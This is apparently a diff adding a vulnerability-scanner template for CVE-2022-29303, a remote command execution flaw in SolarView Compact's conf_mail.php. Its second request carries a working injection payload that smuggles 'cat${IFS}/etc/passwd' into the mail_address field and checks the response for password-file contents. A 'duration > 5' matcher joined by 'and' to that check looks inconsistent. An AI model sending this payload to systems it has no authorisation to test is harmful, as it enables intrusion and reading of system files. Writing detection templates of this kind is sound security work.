@@ -1,0 +1,46 @@
+id: solarview-compact-conf-mail-php-rce
+info:
+  name: SolarView Compact conf_mail.php Remote Command Execution (CVE-2022-29303)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SolarView Compact conf_mail.php is vulnerable to remote command execution (RCE) via a crafted POST request. The vulnerability allows an attacker to execute arbitrary commands on the server.
+  tags: rce,cve,cve-2022-29303
+
+http:
+  - raw:
+      - |
+        GET /conf_mail.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/cgi-bin/p1_network_mail.cgi"
+
+  - raw:
+      - |
+        POST /conf_mail.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        mail_address=%0acat${IFS}/etc/passwd%0a&button=%83%81%81%5B%83%8B%91%97%90M
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: dsl
+        dsl:
+          - duration > 5
